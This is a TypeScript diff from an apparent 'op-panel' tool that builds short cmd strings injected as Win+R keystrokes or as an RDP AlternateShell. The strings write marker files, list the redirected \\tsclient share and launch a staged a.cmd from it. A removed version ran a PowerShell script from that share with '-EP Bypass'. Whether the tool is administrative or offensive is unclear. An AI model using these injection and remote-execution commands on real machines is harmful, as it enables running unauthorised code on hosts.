@@ -174,59 +174,84 @@ export const RDPDR_PROOF_PUBLIC = String.raw`C:\Users\Public\op-panel-proof.txt`
 export const RDPDR_ACK_FILE = 'op-ack.txt';
 
 /**
- * Client Info AlternateShell after a real force-logoff.
+ * Ultra-short Win+R payload: write Public proof without RDPDR / `%` / `&`.
  *
- * Do not point AlternateShell at `\\tsclient\OP\*.cmd` directly: drive redirect
- * is often not ready at shell start, so the session exits before any side effect.
- * Sleep first, write the Public marker, then copy into the RDPDR share.
+ * Lab evidence: AlternateShell after force-logon is ignored; inject works but
+ * scancodes drop `\`, `%`, `&`. Prefer forward slashes and no env vars.
  */
+export function buildInjectPublicProofShell(): string {
+    // Keep this tiny and free of `%` / `&` / `\`. Forward slashes work in cmd.
+    const shell = 'cmd /c echo x>C:/Users/Public/t.txt';
+    if (Buffer.byteLength(shell, 'utf8') + 1 > 510) {
+        throw new AppError({
+            code: 'invalid_argument',
+            message: `Public proof shell exceeds MS-RDPBCGR 512-byte limit (${shell.length} chars)`,
+        });
+    }
+    return shell;
+}
+
+/**
+ * Second-pass Win+R: copy Public marker into the RDPDR ack (proves side-effect
+ * without requiring the first pass to touch `\\tsclient`).
+ */
+export function buildInjectPublicReadbackShell(): string {
+    const shell =
+        `cmd /c copy /y C:/Users/Public/t.txt \\\\tsclient\\${RDPDR_SHARE_NAME}\\${RDPDR_ACK_FILE}`;
+    if (Buffer.byteLength(shell, 'utf8') + 1 > 510) {
+        throw new AppError({
+            code: 'invalid_argument',
+            message: `Public readback shell exceeds MS-RDPBCGR 512-byte limit (${shell.length} chars)`,
+        });
+    }
+    return shell;
+}
+
+/**
+ * Short Win+R launcher for the staged RDPDR `a.cmd` (proof + optional install).
+ * Keep this tiny: fewer keystrokes, lower mid-type terminate risk.
+ */
+export function buildInjectRdpdrLauncherShell(): string {
+    const shell = `\\\\tsclient\\${RDPDR_SHARE_NAME}\\a.cmd`;
+    if (Buffer.byteLength(shell, 'utf8') + 1 > 510) {
+        throw new AppError({
+            code: 'invalid_argument',
+            message: `RDPDR launcher exceeds MS-RDPBCGR 512-byte limit (${shell.length} chars)`,
+        });
+    }
+    return shell;
+}
+
+/** @deprecated Prefer {@link buildInjectPublicProofShell} / {@link buildInjectRdpdrLauncherShell}. */
 export function buildRdpdrProofCmdShell(): string {
-    // Hold the shell after the RDPDR write so the client can finish the transfer
-    // before AlternateShell exit tears the session down.
-    const shell =
-        `cmd.exe /c "timeout /t 12 /nobreak>nul&echo OP-PROOF>%PUBLIC%\\op-panel-proof.txt&` +
-        `copy /y %PUBLIC%\\op-panel-proof.txt \\\\tsclient\\${RDPDR_SHARE_NAME}\\${RDPDR_ACK_FILE}&` +
-        `timeout /t 45 /nobreak>nul"`;
-    if (Buffer.byteLength(shell, 'utf8') + 1 > 510) {
-        throw new AppError({
-            code: 'invalid_argument',
-            message: `RDPDR proof shell exceeds MS-RDPBCGR 512-byte limit (${shell.length} chars)`,
-        });
-    }
-    return shell;
+    return buildInjectPublicProofShell();
 }
 
-/** AlternateShell that proofs via RDPDR then detaches the staged installer. */
+/** @deprecated Prefer {@link buildInjectRdpdrLauncherShell} with staged `a.cmd`. */
 export function buildRdpdrInstallCmdShell(): string {
-    const shell =
-        `cmd.exe /c "timeout /t 12 /nobreak>nul&echo OP-PROOF>%PUBLIC%\\op-panel-proof.txt&` +
-        `copy /y %PUBLIC%\\op-panel-proof.txt \\\\tsclient\\${RDPDR_SHARE_NAME}\\${RDPDR_ACK_FILE}&` +
-        `start /b powershell -NoP -EP Bypass -File \\\\tsclient\\${RDPDR_SHARE_NAME}\\i.ps1&` +
-        `timeout /t 45 /nobreak>nul"`;
-    if (Buffer.byteLength(shell, 'utf8') + 1 > 510) {
-        throw new AppError({
-            code: 'invalid_argument',
-            message: `RDPDR install shell exceeds MS-RDPBCGR 512-byte limit (${shell.length} chars)`,
-        });
-    }
-    return shell;
+    return buildInjectRdpdrLauncherShell();
 }
 
-/** Short AlternateShell that waits for RDPDR then detaches `\\tsclient\OP\i.ps1`. */
+/** Short AlternateShell / inject bootstrap entry. */
 export function buildRdpdrAlternateShellBootstrap(): string {
-    return buildRdpdrInstallCmdShell();
+    return buildInjectRdpdrLauncherShell();
 }
 
 function writeRdpdrProofCmd(dir: string, startInstall: boolean): string {
-    // Wait for RDPDR announce, write Public marker, retry copy until ack visible.
+    // Wait for RDPDR announce, probe `\\tsclient`, write Public marker, retry ack.
     const lines = [
         '@echo off',
         'setlocal',
-        // RDPDR announce can lag Explorer; wait then retry the writeback.
-        'timeout /t 5 /nobreak >nul',
+        // RDPDR announce can lag Explorer; wait then probe share names.
+        'timeout /t 8 /nobreak >nul',
+        `dir \\\\tsclient >%PUBLIC%\\op-tsclient.txt 2>&1`,
+        `dir \\\\tsclient\\${RDPDR_SHARE_NAME} >>%PUBLIC%\\op-tsclient.txt 2>&1`,
         `echo OP-PROOF>%PUBLIC%\\op-panel-proof.txt`,
         'set /a n=0',
         ':copy_ack',
+        // Prefer writing the probe listing into ack so the controller can see the mount.
+        `copy /y %PUBLIC%\\op-tsclient.txt \\\\tsclient\\${RDPDR_SHARE_NAME}\\${RDPDR_ACK_FILE} >nul 2>&1`,
+        `if exist \\\\tsclient\\${RDPDR_SHARE_NAME}\\${RDPDR_ACK_FILE} goto ack_ok`,
         `copy /y %PUBLIC%\\op-panel-proof.txt \\\\tsclient\\${RDPDR_SHARE_NAME}\\${RDPDR_ACK_FILE} >nul 2>&1`,
         `if exist \\\\tsclient\\${RDPDR_SHARE_NAME}\\${RDPDR_ACK_FILE} goto ack_ok`,
         'set /a n+=1',
